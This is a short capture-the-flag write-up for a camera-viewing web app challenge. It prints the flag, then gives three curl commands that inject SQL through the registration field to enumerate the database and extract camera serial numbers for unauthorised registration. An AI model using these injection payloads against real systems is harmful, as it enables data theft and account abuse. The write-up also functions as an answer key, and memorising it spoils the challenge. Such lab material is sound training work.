# SecurityCam #
SecurityCam is a website where users can login to remotely view their camera feeds.
After logging in it serves a video which contains the flag.

## Solution ##

The flag (MCA{oM0kcuLkPk}) can be found in the video.  The video can be accessed by logging in to the website.
Table name can be found by running 
`curl --data "usr=';  SELECT table_name from information_schema.tables -- " localhost/register`
Column names can be found by running 
`curl --data "usr=';  select column_name from information_schema.columns where table_name='cameras'  -- " localhost/register`
Serial number can be found by running
`curl --data "usr='; select serial from cameras where 1=1 -- " localhost/register`
Then register a new account (all that is really needed is something for a username and the serial number from the database).
Successful registration shows the video that contains the flag.